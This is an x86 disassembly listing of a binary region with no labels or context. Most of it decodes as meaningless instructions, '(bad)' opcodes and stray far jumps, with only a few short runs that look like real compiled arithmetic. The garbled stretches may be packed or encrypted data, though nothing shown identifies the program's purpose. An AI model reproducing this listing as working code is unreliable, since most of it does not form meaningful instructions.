  405d9b:	lock mov ah,0x59
  405d9e:	adc    al,0x7
  405da0:	aas    
  405da1:	xlat   BYTE PTR ds:[ebx]
  405da2:	test   al,0x6f
  405da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405da5:	xor    ah,BYTE PTR [edi]
  405da7:	add    edx,DWORD PTR [edi+0x2dd98b2d]
  405dad:	stos   BYTE PTR es:[edi],al
  405dae:	jno    0x405e26
  405db0:	jo     0x405e13
  405db2:	in     eax,dx
  405db3:	jnp    0x405d36
  405db5:	stos   DWORD PTR es:[edi],eax
  405db6:	(bad)  
  405db7:	rol    BYTE PTR [ebx-0x3ccb5e11],0x7c
  405dbe:	mov    ds:0x90eb45f8,eax
  405dc3:	cli    
  405dc4:	lods   eax,DWORD PTR ds:[esi]
  405dc5:	lock cmp eax,0x5107e872
  405dcb:	mov    esp,0x96c0a40e
  405dd0:	pop    esi
  405dd1:	loope  0x405d6a
  405dd3:	pushf  
  405dd4:	ret    
  405dd5:	les    eax,FWORD PTR [ebp-0x7e5ba3e0]
  405ddb:	adc    ah,BYTE PTR [esi-0x7c66279a]
  405de1:	fdivp  st(4),st
  405de3:	inc    ebx
  405de4:	inc    edx
  405de5:	jp     0x405e52
  405de7:	lods   al,BYTE PTR ds:[esi]
  405de8:	cmc    
  405de9:	push   0xffffff82
  405deb:	xchg   esi,eax
  405dec:	(bad)  
  405ded:	(bad)  
  405dee:	(bad)  
  405def:	and    eax,0x61db7d66
  405df4:	xor    ch,bh
  405df6:	(bad)  
  405df7:	aaa    
  405df8:	jl     0x405dbc
  405dfa:	inc    edi
  405dfb:	aam    0x18
  405dfd:	rcl    BYTE PTR [edx-0x12],cl
  405e00:	nop
  405e01:	adc    BYTE PTR [ecx+0x55],0x1a
  405e05:	jns    0x405daa
  405e07:	push   0xffffffbc
  405e09:	pop    ds
  405e0a:	mov    edi,0xdbdd0baa
  405e0f:	popa   
  405e10:	or     esp,DWORD PTR [esi]
  405e12:	pop    esp
  405e13:	fcomp  QWORD PTR [edx+0x6a0a27b0]
  405e19:	ret    
  405e1a:	in     al,0x8c
  405e1c:	sahf   
  405e1d:	out    dx,al
  405e1e:	loopne 0x405da7
  405e20:	push   ss
  405e21:	or     eax,0xc2128349
  405e26:	rol    DWORD PTR [ebp+0x21e856f9],cl
  405e2c:	popa   
  405e2d:	and    al,0xb6
  405e2f:	adc    BYTE PTR [edi-0x4a7d8f32],0x65
  405e36:	ret    0x32f4
  405e39:	and    al,0x43
  405e3b:	adc    DWORD PTR [ebx],0xffffffac
  405e3e:	shr    DWORD PTR [edi-0x5d],cl
  405e41:	jl     0x405ebc
  405e43:	(bad)  
  405e44:	xchg   edx,eax
  405e45:	cmp    al,0xb4
  405e47:	inc    edx
  405e48:	ret    
  405e49:	mul    BYTE PTR [edi+edi*1-0x42]
  405e4d:	(bad)  
  405e4e:	out    dx,eax
  405e4f:	shr    BYTE PTR [ecx-0x16d94c7f],0x9e
  405e56:	fcomi  st,st(1)
  405e58:	jb     0x405e52
  405e5a:	and    ch,BYTE PTR [ebp-0x4840d2aa]
  405e60:	mov    BYTE PTR [esi],dl
  405e62:	repnz and eax,0x909924d1
  405e68:	xchg   ecx,eax
  405e69:	sbb    al,0xa2
  405e6b:	loopne 0x405e86
  405e6d:	inc    edi
  405e6e:	add    BYTE PTR ds:0x173e5d8e,0x1e
  405e75:	ficomp WORD PTR [edi]
  405e77:	idiv   BYTE PTR [eax+0x7d]
  405e7a:	ja     0x405e18
  405e7c:	jno    0x405e77
  405e7e:	ss test al,0x53
  405e81:	or     al,0x99
  405e83:	icebp  
  405e84:	jnp    0x405efd
  405e86:	addr16 jmp 0xf1c4:0x63b3a8b8
  405e8e:	loope  0x405ee1
  405e90:	and    DWORD PTR [ebx-0x7d6ffad],edi
  405e96:	out    0xe7,eax
  405e98:	int3   
  405e99:	retf   
  405e9a:	ret    0x4ee1
  405e9d:	inc    esp
  405e9e:	xchg   esi,eax
  405e9f:	fs das 
  405ea1:	lods   al,BYTE PTR ds:[esi]
  405ea2:	sbb    BYTE PTR ds:0xa754b0ae,dl
  405ea8:	xchg   edi,edx
  405eaa:	inc    edx
  405eab:	fwait
  405eac:	xchg   edx,eax
  405ead:	popa   
  405eae:	jmp    FWORD PTR [esi]
  405eb0:	int3   
  405eb1:	cs push cs
  405eb3:	mov    eax,ds:0xa5e7121d
  405eb8:	dec    eax
  405eb9:	inc    ecx
  405eba:	ror    BYTE PTR [ebx*2+0x39f8ee22],cl
  405ec1:	inc    ecx
  405ec2:	add    BYTE PTR [esi],al
  405ec4:	adc    eax,0x943e9d98
  405ec9:	jmp    0xfe4d0b68
  405ece:	add    esp,ebp
  405ed0:	mov    ds:0xd6231a2a,eax
  405ed5:	scas   al,BYTE PTR es:[edi]
  405ed6:	enter  0xe543,0x24
  405eda:	jmp    0x18c2:0x7b47bd5d
  405ee1:	add    esp,DWORD PTR [esi+ebx*8-0x4ead8c37]
  405ee8:	sub    BYTE PTR [edi],bl
  405eea:	mov    cl,0x5d
  405eec:	scas   al,BYTE PTR es:[edi]
  405eed:	adc    esp,DWORD PTR [esp+ebp*1]
  405ef0:	xchg   ebx,eax
  405ef1:	fnsave [esi+0x7531352d]
  405ef7:	xchg   esp,eax
  405ef8:	push   edx
  405ef9:	in     al,0xfd
  405efb:	xor    al,0xd3
  405efd:	sbb    al,0x5e
  405eff:	ins    DWORD PTR es:[edi],dx
  405f00:	fwait
  405f01:	test   al,0x3c
  405f03:	push   ebx
  405f04:	stc    
  405f05:	fmul   st(4),st
  405f07:	in     al,0xa5
  405f09:	and    DWORD PTR [edi],ebp
  405f0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f0c:	mov    BYTE PTR [ecx-0x404a7d32],0x10
  405f13:	ds into 
  405f15:	mov    ?,WORD PTR [ebx-0x73ab6a37]
  405f1b:	and    eax,0xc975c758
  405f20:	dec    esi
  405f21:	pop    esp
  405f22:	xchg   DWORD PTR [ecx],esi
  405f24:	outs   dx,BYTE PTR ds:[esi]
  405f25:	scas   eax,DWORD PTR es:[edi]
  405f26:	addr16 ss and ebp,edi
  405f2a:	mov    dl,0x58
  405f2c:	mov    bh,0x5b
  405f2e:	jns    0x405f8d
  405f30:	xor    al,0x9d
  405f32:	retf   
  405f33:	and    al,0x84
  405f35:	adc    al,0x15
  405f37:	xchg   ebp,eax
  405f38:	dec    ecx
  405f39:	retf   0x564b
  405f3c:	outs   dx,DWORD PTR es:[esi]
  405f3e:	scas   al,BYTE PTR es:[edi]
  405f3f:	push   ss
  405f40:	xor    eax,0xfe9311e4
  405f45:	test   DWORD PTR [ebx+0x7a],ecx
  405f48:	adc    BYTE PTR [ebx+0x73993e1f],dh
  405f4e:	fisttp WORD PTR [ebx]
  405f50:	xchg   esp,eax
  405f51:	jmp    0x9a0f67df
  405f56:	out    dx,eax
  405f57:	cmp    BYTE PTR [esp+esi*2+0x6f],cl
  405f5b:	out    dx,al
  405f5c:	sub    eax,0x1f7f141
  405f61:	bound  ebp,QWORD PTR [ebx-0x3de7e41]
  405f67:	push   ebp
  405f68:	mov    al,0x10
  405f6a:	pop    es
  405f6b:	clc    
  405f6c:	and    cl,bh
  405f6e:	mov    gs,WORD PTR [ecx-0x53]
  405f71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f72:	ins    BYTE PTR es:[edi],dx
  405f73:	repnz in al,dx
  405f75:	lock int 0xbb
  405f78:	pop    esi
  405f79:	jg     0x405f31
  405f7b:	aad    0x16
  405f7d:	(bad)  [bp+di]
  405f80:	cmp    al,dh
  405f82:	retf   0xf6ac
  405f85:	pusha  
  405f86:	sbb    al,0xe6
  405f88:	paddusb mm6,mm7
  405f8b:	into   
  405f8c:	pop    ebp
  405f8d:	aam    0x9a
  405f8f:	xchg   ebx,eax
  405f90:	jmp    0xae7da11c
  405f95:	or     eax,0xecf56d19
  405f9a:	idiv   bh
  405f9c:	pop    ebx
  405f9d:	inc    ecx
  405f9e:	loop   0x405fac
  405fa0:	into   
  405fa1:	cmc    
  405fa2:	ds addr16 sub eax,0x5d5323b3
  405fa9:	mov    ch,0xd3
  405fab:	jae    0x405f54
  405fad:	and    bl,dl
  405faf:	fldcw  WORD PTR [ebx-0x73]
  405fb2:	pop    edx
  405fb3:	in     eax,0x1c
  405fb5:	inc    ebx
  405fb6:	cld    
  405fb7:	pop    edi
  405fb8:	scas   al,BYTE PTR es:[edi]
  405fb9:	ss inc edx
  405fbb:	aaa    
  405fbc:	rol    DWORD PTR [eax+ebx*2],1
  405fbf:	jno    0x40603b
  405fc1:	icebp  
  405fc2:	(bad)  
  405fc3:	repnz fwait
  405fc5:	xchg   esp,eax
  405fc6:	fisttp WORD PTR [ecx+eax*2+0x28]
  405fca:	xchg   edx,eax
  405fcb:	xor    BYTE PTR [eax],ah
  405fcd:	jbe    0x405fa5
  405fcf:	mov    eax,ds:0xbef2c35b
  405fd4:	or     ah,bh
  405fd6:	nop
  405fd7:	inc    esp
  405fd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fd9:	and    cl,dh
  405fdb:	xlat   BYTE PTR ds:[ebx]
  405fdc:	mov    al,ds:0xeab7646d
  405fe1:	dec    BYTE PTR [esi]
  405fe3:	(bad)  
  405fe4:	out    dx,al
  405fe5:	mov    ch,0x11
  405fe7:	add    al,0xa3
  405fe9:	mov    dl,0x6c
  405feb:	lods   al,BYTE PTR ds:[esi]
  405fec:	imul   esi,DWORD PTR [ebp-0x18],0x378d815c
  405ff3:	jmp    0xcfc65f3c
  405ff8:	arpl   WORD PTR [esp+edi*2],bp
  405ffb:	(bad)  
  405ffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fff:	jno    0x40606f
  406001:	inc    edi
  406002:	ja     0x405fd3
  406004:	lds    eax,FWORD PTR [edx]
  406006:	jne    0x406085
  406008:	sbb    cl,BYTE PTR [ecx+0x74]
  40600b:	sti    
  40600c:	rol    DWORD PTR [ebx],cl
  40600e:	mov    esp,0xbc4bc62a
  406013:	out    dx,eax
  406014:	sbb    DWORD PTR [edx+edx*8+0xbff48e2],0x6e
  40601c:	fild   WORD PTR [ebp+ebp*2-0x11]
  406020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406021:	scas   eax,DWORD PTR es:[edi]
  406022:	je     0x405fe2
  406024:	into   
  406025:	fs xchg ebx,eax
  406027:	in     eax,0xc7
  406029:	idiv   DWORD PTR ds:0x1469d031
  40602f:	push   edx
  406030:	xlat   BYTE PTR ds:[ebx]
  406031:	test   DWORD PTR [esi-0x6d14d888],ebp
  406037:	arpl   WORD PTR [edx-0x329d8274],bx
  40603d:	or     al,0xcc
  40603f:	jo     0x405fdf
  406041:	ret    
  406042:	push   0x60622d22
  406047:	(bad)  
  406048:	int    0xd0
  40604a:	xchg   edi,eax
  40604b:	pop    ecx
  40604c:	mov    fs,WORD PTR [esi+0x62]
  40604f:	push   eax
  406050:	dec    edi
  406051:	not    BYTE PTR [ebx]
  406053:	imul   ebx,DWORD PTR [edx+0x89a2a89],0xf877fe0a
  40605d:	mov    eax,0x6b4f8e54
  406062:	jecxz  0x406039
  406064:	sbb    edx,DWORD PTR [ebp-0x662a0c39]
  40606a:	outs   dx,DWORD PTR ds:[esi]
  40606b:	or     ebx,esi
  40606d:	mov    ebp,0x78e67554
  406072:	loopne 0x406098
  406074:	jecxz  0x406027
  406076:	pop    esi
  406077:	repnz mov ecx,0x7336fa4e
  40607d:	cld    
  40607e:	fstp   QWORD PTR [eax-0x7d]
  406081:	cmp    al,0x6
  406083:	push   eax
  406084:	mov    edx,0x164923ae
  406089:	adc    eax,0x850938ea
  40608e:	outs   dx,DWORD PTR ds:[esi]
  40608f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406090:	sub    cl,dh
  406092:	xor    dl,cl
  406094:	div    DWORD PTR ds:0x88d3933
  40609a:	sbb    ebp,DWORD PTR [eax-0x6f]
  40609d:	or     eax,0x2ae17d19
  4060a2:	fnsave [ecx-0x64]
  4060a5:	adc    esi,edx
  4060a7:	pop    ds
  4060a8:	out    dx,al
  4060a9:	js     0x4060fd
  4060ab:	fstp   TBYTE PTR [edi]
  4060ad:	cmp    bh,BYTE PTR [edx+ebp*8]
  4060b0:	add    ax,WORD PTR [ebx]
  4060b3:	cli    
  4060b4:	and    ah,BYTE PTR [ebx+0x7e]
  4060b7:	xchg   edi,eax
  4060b8:	inc    edx
  4060b9:	pop    ebx
  4060ba:	pop    ds
  4060bb:	mov    WORD PTR [eax],cs
  4060bd:	mov    edi,0x70f95d4b
  4060c2:	xchg   edx,eax
  4060c3:	inc    esi
  4060c4:	repz fld DWORD PTR [edx+0x11e80008]
  4060cb:	cdq    
  4060cc:	imul   edx,DWORD PTR [eax],0xe1f026af
  4060d2:	xchg   esp,eax
  4060d3:	sub    esi,esp
  4060d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060d6:	jecxz  0x4060a7
  4060d8:	je     0x406064
  4060da:	repnz sub BYTE PTR [ebx-0x13],al
  4060de:	push   ebx
  4060df:	fst    DWORD PTR [edx+0x49]
  4060e2:	xor    cl,BYTE PTR [eax+0x1f]
  4060e5:	xor    DWORD PTR [esp+eiz*2],eax
  4060e8:	pop    edx
  4060e9:	aaa    
  4060ea:	mov    ds,WORD PTR [edi+ebx*2-0x1ee4e28a]
  4060f1:	repz sbb eax,0x3998ebf6
  4060f7:	lea    eax,[ebp+eax*1-0x4]
  4060fb:	mov    DWORD PTR [ebp-0x34],eax
  4060fe:	mov    eax,DWORD PTR [ebp-0x30]
  406101:	mov    ecx,DWORD PTR [ebp-0x2c]
  406104:	shrd   eax,ecx,0x2
  406108:	shr    ecx,0x2
  40610b:	mov    ecx,DWORD PTR [ebp-0x30]
  40610e:	mov    edx,DWORD PTR [ebp-0x2c]
  406111:	shl    ecx,0x1e
  406114:	mov    ecx,DWORD PTR [ebp-0x14]
  406117:	xor    eax,edi
  406119:	xor    edx,edx
  40611b:	jmp    0x4064f9
  406120:	sar    DWORD PTR [ebx+0x5b],cl
  406123:	mov    ecx,0x5b3bb91b
  406128:	lds    eax,FWORD PTR [ebx+0x27]
  40612b:	stos   BYTE PTR es:[edi],al
  40612c:	sub    DWORD PTR [ebx],esp
  40612e:	xchg   ebx,eax
  40612f:	mov    esp,0x1818a378
  406134:	sahf   
  406135:	adc    bl,BYTE PTR [eax]
  406137:	sbb    BYTE PTR [ecx-0x720fdcd],al
  40613d:	sbb    eax,0xb529f0df
  406142:	and    edi,DWORD PTR ds:0x40761e1f
  406148:	inc    ebx
  406149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40614a:	sbb    dl,ah
  40614c:	int    0x3f
  40614e:	out    dx,eax
  40614f:	pop    es
  406150:	outs   dx,BYTE PTR ds:[esi]
  406151:	adc    al,al
  406153:	pop    esp
  406154:	pop    esp
  406155:	xchg   esi,eax
  406156:	(bad)  
  406157:	aaa    
  406158:	sub    eax,0x16013338
  40615d:	outs   dx,DWORD PTR ds:[esi]
  40615e:	stos   BYTE PTR es:[edi],al
  40615f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406160:	daa    
  406161:	lock mov ss,esi
  406164:	cmp    al,0xbf
  406166:	test   DWORD PTR [ebp*4+0x5a65f8f5],ecx
  40616d:	clc    
  40616e:	dec    eax
  40616f:	and    DWORD PTR [edx-0x5566f43],0xaf367b11
  406179:	test   al,0x48
  40617b:	retf   
  40617c:	ret    
  40617d:	add    cl,BYTE PTR [ebp-0x617f65a0]
  406183:	sub    ah,BYTE PTR [edx*4+0x611c4ddf]
  40618a:	pop    eax
  40618b:	fist   WORD PTR [eax-0x230da5df]
  406191:	mov    al,ds:0xd5949c2a
  406196:	pop    esi
  406197:	repnz sub BYTE PTR [edx+0x4f],bl
  40619b:	push   0xe4f39c06
  4061a0:	(bad)  
  4061a1:	inc    ebx
  4061a2:	(bad)  
  4061a3:	push   edx
  4061a4:	mov    ecx,0x24eb0854
  4061a9:	jle    0x406157
  4061ab:	mov    esi,0x491491d6
  4061b0:	jnp    0x406161
  4061b2:	stc    
  4061b3:	jae    0x40619d
  4061b5:	ret    0x6705
  4061b8:	pop    esi
  4061b9:	cmp    BYTE PTR [eax+0x1d2912d1],ah
  4061bf:	mov    ebp,0xaad93b63
  4061c4:	sahf   
  4061c5:	in     al,dx
  4061c6:	nop
  4061c7:	rol    al,0xa2
  4061ca:	dec    ecx
  4061cb:	push   0xffffffce
  4061cd:	add    cl,BYTE PTR [esi+edi*1+0x44]
  4061d1:	in     al,dx
  4061d2:	push   ebp
  4061d3:	mov    al,ds:0x87c569c8
  4061d8:	mov    ds:0x56d527c8,al
  4061dd:	add    al,0xc0
  4061df:	push   es
  4061e0:	js     0x406237
  4061e2:	sbb    esp,esi
  4061e4:	imul   BYTE PTR [ebx]
  4061e6:	adc    al,BYTE PTR [esi]
  4061e8:	pop    esp
  4061e9:	mov    bl,0x13
  4061eb:	stc    
  4061ec:	ret    
  4061ed:	cli    
  4061ee:	adc    ah,bh
  4061f0:	xchg   edx,eax
  4061f1:	scas   eax,DWORD PTR es:[edi]
  4061f2:	paddd  mm4,mm4
  4061f5:	mov    bl,BYTE PTR [ebp+0x29]
  4061f8:	pop    esp
  4061f9:	dec    edx
  4061fa:	push   0xc231f1de
  4061ff:	out    0xf4,al
  406201:	dec    edx
  406202:	xor    eax,0xd4b8e7e5
  406207:	ret    0x75a2
  40620a:	(bad)  
  40620b:	push   ss
  40620c:	mov    edi,0x47ae7648
  406211:	dec    esi
  406212:	hlt    
  406213:	mov    ebx,eax
  406215:	cli    
  406216:	in     al,dx
  406217:	mov    al,0xe3
  406219:	sbb    ah,BYTE PTR [edi-0x27]
  40621c:	(bad)
  40621f:	xor    ebp,esp
  406221:	rcr    BYTE PTR [edx+0x16e58289],cl
  406227:	pop    eax
  406228:	jmp    0x3815:0x70b7e8a4
  40622f:	and    eax,0xb3e4756b
  406234:	cs pusha 
  406236:	sar    BYTE PTR [eax+0x22],1
  406239:	aas    
  40623a:	jne    0x4061eb
  40623c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40623d:	or     dl,BYTE PTR [esp+ebx*1-0x43f9aa95]
  406244:	(bad)  
  406245:	adc    al,0x4c
  406247:	fnsave [esi+0x4101f03e]
  40624d:	pusha  
  40624e:	mov    es,WORD PTR fs:[eax+edi*1]
  406252:	int3   
  406253:	adc    bh,bh
  406255:	adc    DWORD PTR [edx+esi*8-0x6c],0x76403af9
  40625d:	rol    BYTE PTR [esi],cl
  40625f:	or     eax,0x8075d7b5
  406264:	es xor eax,0xa0dd6588
  40626a:	call   0xfb6d:0xf01f87ab
  406271:	push   cs
  406272:	xchg   esp,eax
  406273:	push   ds
  406274:	aad    0x4c
  406276:	sbb    DWORD PTR [edi+0x31e76eab],esi
  40627c:	cdq    
  40627d:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40627f:	dec    cx
  406281:	push   edx
  406282:	adc    al,0xc1
  406284:	(bad)  
  406285:	ins    BYTE PTR es:[edi],dx
  406286:	or     edi,0xffffff97
  406289:	sti    
  40628a:	mov    DWORD PTR [edi-0x2a],ebx
  40628d:	sar    BYTE PTR [edi+0x41],cl
  406290:	arpl   WORD PTR [ebx],ax
  406292:	aam    0x3c
  406294:	pop    cx
  406296:	dec    eax
  406297:	cmp    DWORD PTR [esi-0x8],esi
  40629a:	pop    es
  40629b:	out    0xd6,al
  40629d:	add    esi,ebx
  40629f:	push   ds
  4062a0:	aaa    
  4062a1:	fwait
  4062a2:	sbb    eax,0x63499d10
  4062a7:	push   ebp
  4062a8:	sub    edi,DWORD PTR [ebp-0x2b]
  4062ab:	xchg   edi,eax
  4062ac:	mov    eax,0x78387088
  4062b1:	dec    esi
  4062b2:	test   eax,0xf3008b85
  4062b7:	xor    al,0xb5
  4062b9:	lods   eax,DWORD PTR ds:[esi]
  4062ba:	fld    QWORD PTR [edi]
  4062bc:	dec    ebp
  4062bd:	outs   dx,DWORD PTR ds:[esi]
  4062be:	pop    edx
  4062bf:	jmp    0x6d5e:0x5e00c50a
  4062c6:	test   al,0xfa
  4062c8:	cmp    DWORD PTR [ebp-0x19],0x1f
  4062cc:	jl     0x4062ad
  4062ce:	(bad)  
  4062cf:	aam    0xd7
  4062d1:	scas   eax,DWORD PTR es:[edi]
  4062d2:	ret    
  4062d3:	pop    es
  4062d4:	jp     0x406315
  4062d6:	and    BYTE PTR [ebx+0x52],al
  4062d9:	sbb    DWORD PTR [edx-0x505e2e82],ebx
  4062df:	inc    edx
  4062e0:	mov    bl,0x39
  4062e3:	icebp  
  4062e4:	clc    
  4062e5:	jnp    0x4062c4
  4062e7:	ins    BYTE PTR es:[edi],dx
  4062e8:	pushf  
  4062e9:	push   edi
  4062ea:	jmp    0x6895063
  4062ef:	lahf   
  4062f0:	in     al,dx
  4062f1:	pusha  
  4062f2:	cli    
  4062f3:	sub    BYTE PTR [ecx],bh
  4062f5:	mov    ebx,0xebd64e97
  4062fa:	pop    ds
  4062fb:	push   0x7cbf8ced
  406300:	(bad)  
  406301:	push   ebp
  406302:	cmc    
  406303:	or     DWORD PTR [edx],ebp
  406305:	ss in  al,dx
  406307:	(bad)  
  406308:	dec    edi
  406309:	push   0x261a5cfb
  40630e:	stc    
  40630f:	cmp    eax,0xd6ca2772
  406314:	jl     0x4062e8
  406316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406317:	and    BYTE PTR [edx+0x1209940],bl
  40631d:	cmp    al,0x7c
  40631f:	imul   edx,ebp,0xffffff9b
  406322:	inc    eax
  406323:	xor    esi,DWORD PTR [eax+0x43]
  406326:	pop    edx
  406327:	jmp    0x4062f6
  406329:	dec    edi
  40632a:	pop    ss
  40632b:	xchg   ecx,eax
  40632c:	ficomp DWORD PTR [edx+0x283ba13]
  406332:	mov    eax,0x2ce45f4b
  406337:	push   esp
  406338:	popa   
  406339:	xchg   ebx,eax
  40633a:	das    
  40633b:	mov    ch,0x8b
  40633d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40633e:	in     eax,dx
  40633f:	das    
  406340:	push   ecx
  406341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406342:	cmp    eax,0x95758962
  406347:	xchg   edi,eax
  406348:	loop   0x4062d8
  40634a:	xlat   BYTE PTR ds:[ebx]
  40634b:	imul   BYTE PTR [edi+0x3f]
  40634e:	xchg   edi,eax
  40634f:	xchg   esi,eax
  406350:	popf   
  406351:	in     al,dx
  406352:	dec    ecx
  406353:	xchg   ecx,eax
  406354:	in     al,0xe0
  406356:	adc    eax,0x8d80086d
  40635b:	(bad)  
  40635c:	outs   dx,BYTE PTR ds:[esi]
  40635d:	popa   
  40635e:	lods   eax,DWORD PTR ds:[esi]
  40635f:	(bad)  
  406360:	xchg   ebx,eax
  406361:	pusha  
  406362:	mov    edx,esi
  406364:	pextrw eax,(bad),0xc5
  406366:	xchg   DWORD PTR [esi],eax
  406368:	sub    eax,0xf2e1007c
  40636d:	in     al,0x1a
  40636f:	add    DWORD PTR [ebp-0xe2bf87c],esi
  406375:	clc    
  406376:	cdq    
  406377:	and    BYTE PTR [esi-0x67b5e8be],bh
  40637d:	clc    
  40637e:	push   0xfffffff3
  406380:	ds jbe 0x406316
  406383:	stos   BYTE PTR es:[edi],al
  406384:	pop    esp
  406385:	mov    dl,0xe3
  406387:	and    BYTE PTR [ebx+ebp*4],ch
  40638a:	bound  ebx,QWORD PTR [esi-0x581c38f6]
  406390:	(bad)  
  406391:	push   cs
  406392:	pushf  
  406393:	clc    
  406394:	das    
  406395:	lods   al,BYTE PTR ds:[esi]
  406396:	mov    cl,0x61
  406398:	pop    edi
  406399:	sar    ecx,0x6e
  40639c:	nop
  40639d:	xlat   BYTE PTR ds:[ebx]
  40639e:	icebp  
  40639f:	xor    edi,DWORD PTR [edx-0x70]
  4063a2:	add    cl,BYTE PTR [ebx+0x74]
  4063a5:	scas   eax,DWORD PTR es:[edi]
  4063a6:	adc    cl,al
  4063a8:	out    0x1e,eax
  4063aa:	outs   dx,DWORD PTR ds:[esi]
  4063ab:	sbb    dl,BYTE PTR [ebx-0x1a840fb5]
  4063b1:	cdq    
  4063b2:	xchg   ebp,eax
  4063b3:	push   ds
  4063b4:	dec    edx
  4063b5:	dec    esp
  4063b6:	aas    
  4063b7:	jb     0x406431
  4063b9:	sub    esi,edi
  4063bb:	pusha  
  4063bc:	mov    ecx,0xfaa4d88e
  4063c1:	ins    BYTE PTR es:[edi],dx
  4063c2:	fwait
  4063c3:	pop    DWORD PTR [esi-0x2f26b440]
  4063c9:	call   0x6cd6:0xa734a001
  4063d0:	cdq    
  4063d1:	shl    BYTE PTR [ecx+0x7],cl
  4063d4:	js     0x406416
  4063d6:	push   ecx
  4063d7:	repz mov edx,0xed92b9c3
  4063dd:	ja     0x406383
  4063df:	jg     0x40639b
  4063e1:	mov    bh,0x1f
  4063e3:	sar    DWORD PTR [ecx-0x33163c2e],cl
  4063e9:	mov    al,0x18
  4063eb:	aam    0x7f
  4063ed:	scas   al,BYTE PTR es:[edi]
  4063ee:	sbb    BYTE PTR [ecx-0x66b6aebf],dl
  4063f4:	mov    ebp,0xd8ea1e
  4063f9:	(bad)  
  4063fa:	mov    ds:0x3d95d22,eax
  4063ff:	ret    0xe0cb
  406402:	cld    
  406403:	push   edx
  406404:	inc    ecx
  406405:	and    BYTE PTR [edx+0x131debbe],al
  40640b:	mov    dl,0x94
  40640d:	push   esi
  40640e:	int    0x43
  406410:	inc    edx
  406411:	aad    0x24
  406413:	add    DWORD PTR [esi-0x6e353f0],0xd433c6c8
  40641d:	push   0x40
  40641f:	push   0x25869e1c
  406424:	pushf  
  406425:	das    
  406426:	inc    edi
  406427:	cmp    al,0x85
  406429:	push   esp
  40642a:	lds    esp,FWORD PTR [esi]
  40642c:	adc    eax,DWORD PTR [edx-0x56]
  40642f:	pop    ecx
  406430:	mov    dl,BYTE PTR [esi]
  406432:	pop    edx
  406433:	pop    eax
  406434:	outs   dx,BYTE PTR ds:[esi]
  406435:	mov    bl,0x5a
  406437:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406438:	scas   eax,DWORD PTR es:[edi]
  406439:	lea    eax,[ebp-0x307cd322]
  40643f:	int    0xcd
  406441:	cmp    DWORD PTR [esi-0x69dfdda2],edi
  406447:	pusha  
  406448:	push   0xfffffff0
  40644a:	out    0x73,al
  40644c:	pop    edx
  40644d:	jge    0x406495
  40644f:	cmp    al,0x81
  406451:	lea    edi,[eax+0x1a]
  406454:	sahf   
  406455:	pop    ss
  406456:	clc    
  406457:	call   0xe4c706d6
  40645c:	xor    edi,DWORD PTR [edx-0x6d9cee88]
  406462:	fs xchg edx,eax
  406464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406465:	mov    eax,ds:0x651398af
  40646a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40646b:	shl    eax,cl
  40646d:	lahf   
  40646e:	dec    esi
  40646f:	xchg   esi,eax
  406470:	pushf  
  406471:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406472:	call   0x1ed9:0xbc8c0a84
  406479:	xor    BYTE PTR [esi+0x31],0xed
  40647d:	sub    ch,dh
  40647f:	mov    dh,0x53
  406481:	xlat   BYTE PTR ds:[ebx]
  406482:	push   ds
  406483:	fist   DWORD PTR [edi-0x70]
  406486:	dec    esp
  406487:	dec    eax
  406488:	fs xor dl,cl
  40648b:	lea    ebp,[edi]
  40648d:	cdq    
  40648e:	pop    eax
  40648f:	(bad)  
  406490:	out    0x4c,al
  406492:	push   edx
  406493:	xchg   esi,eax
  406494:	in     al,dx
  406495:	xor    DWORD PTR [ebx+0x46],0xc85cf1ec
  40649c:	dec    esi
  40649d:	sbb    eax,0xcfc75caf
  4064a2:	iret   
  4064a3:	push   0xfebf6eca
  4064a8:	jns    0x406451
  4064aa:	ret    0x18ce
  4064ad:	arpl   WORD PTR [edx+0x6c61565f],dx
  4064b3:	in     al,dx
  4064b4:	test   DWORD PTR [edx-0x4cf938bc],ebp
  4064ba:	ss jno 0x406523
  4064bd:	call   0x1710:0xf4b6bca3
  4064c4:	push   ss
  4064c5:	retf   0x1c70
  4064c8:	pop    esp
  4064c9:	cmp    al,0xf8
  4064cb:	push   ebp
  4064cc:	(bad)  
  4064cd:	icebp  
  4064ce:	cmp    BYTE PTR [edi],bh
  4064d0:	add    eax,0xc590ce72
  4064d5:	add    ecx,DWORD PTR [ecx-0x63e209c7]
  4064db:	cdq    
  4064dc:	or     eax,0xcda18a6b
  4064e1:	cmp    ax,0x68d0
  4064e5:	inc    edx
  4064e6:	cmp    cl,BYTE PTR [ebp-0x27382d1d]
  4064ec:	sbb    DWORD PTR [edx],esp
  4064ee:	ficom  WORD PTR [edi-0x23c0ccb0]
  4064f4:	leavew 
  4064f6:	sub    DWORD PTR fs:[esi+0xc8ac20b],esp
  4064fd:	or     BYTE PTR [ebx+0x830cc45],cl
  406503:	mov    eax,DWORD PTR [ebp-0x20]
  406506:	mov    ecx,DWORD PTR [ebp-0x1c]
  406509:	shrd   eax,ecx,0x2
  40650d:	shr    ecx,0x2
  406510:	mov    ecx,DWORD PTR [ebp-0x20]
  406513:	mov    edx,DWORD PTR [ebp-0x1c]
  406516:	xor    eax,edi
  406518:	shl    ecx,0x1e
  40651b:	xor    edx,edx
  40651d:	or     eax,edx
  40651f:	lea    eax,[ebp+eax*1-0x4]
  406523:	mov    DWORD PTR [ebp-0x34],eax
  406526:	mov    eax,DWORD PTR [ebp-0x20]
